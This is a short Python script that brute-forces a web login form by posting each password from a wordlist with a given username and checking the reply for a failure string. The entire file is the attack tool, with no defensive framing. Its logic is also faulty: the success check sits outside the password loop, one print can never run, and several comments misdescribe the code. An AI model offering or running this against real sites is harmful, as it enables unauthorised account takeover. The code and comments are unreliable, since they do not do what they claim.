import requests #This library allows us to automate the process of sending post and git requests to the server
url = input('[+] Enter the URL:  ') #The buser will input the URL of the website that he wants to access 
username = input('[+] Enter the Username:  ') #The buser will input the username of the website that he wants to access
password_file = input('[+] Enter the Password File:  ') #The buser will input the password file that he wants to access
login_failed_string = input('[+] Enter String That Occurs When Login Fails:  ') #The buser will input the string that he wants to be displayed when the login fails
def cracking(username, url, login_failed_string): #This function will take the username and url and send the post request to the website
     with open(password_file, 'r') as passwords: #This loop will take the password file and iterate through the passwords
          for password in passwords: #This will remove the whitespace from the password
              password = password.strip() #This will remove the whitespace from the password  
              print('Trying: ' + password) #This will print the password that is being tried
              data = {'username':username, 'password':password, 'Login':'submit'} #This will create a dictionary with the username as the key and the password as the value
              response = requests.post(url, data=data) #This will send the post request to the website
          if login_failed_string in response.text: #This will check if the login failed string is in the response
                print('[-] Failed: ' +password) #This will skip the password that failed
          else: #This will check if the login succeeded
                    print('[+] Found Username: ==> ' + username) #This will print the username that was found
                    print('[+] Password: ==>'+ password) #This will print the password that was found
                    return #This will exit the program
                    print('[!!] Password Not In List')
cracking(username, url, login_failed_string)




